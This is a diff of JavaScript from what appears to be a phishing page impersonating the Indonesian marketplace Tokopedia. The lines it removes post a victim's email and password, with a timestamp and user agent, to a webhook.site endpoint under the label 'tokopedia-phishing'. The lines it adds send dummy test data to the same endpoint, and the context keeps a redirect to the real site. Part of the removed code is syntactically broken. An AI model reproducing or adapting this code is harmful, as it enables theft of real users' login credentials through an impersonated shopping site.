@@ -69,26 +69,13 @@
         // URL WEBHOOK KAMU: https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3
         const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
         
-        fetch(WEBHOOK_URL, {const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent,
-                source: 'tokopedia-phishing'
-            })
-        })
-        .then(response => {
-            console.log('✅ Status:', response.status);
-            console.log('✅ Data terkirim ke webhook baru');
-        })
-        .catch(error => {
-            console.error('❌ Gagal mengirim:', error);
-        });
+fetch('https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({test: 'data dummy', time: new Date()})
+})
+.then(() => console.log('✅ Manual test berhasil!'))
+.catch(err => console.error('❌ Gagal:', err));
         
         // 3. REDIRECT KE TOKOPEDIA SETELAH 1.5 DETIK
         setTimeout(function() {
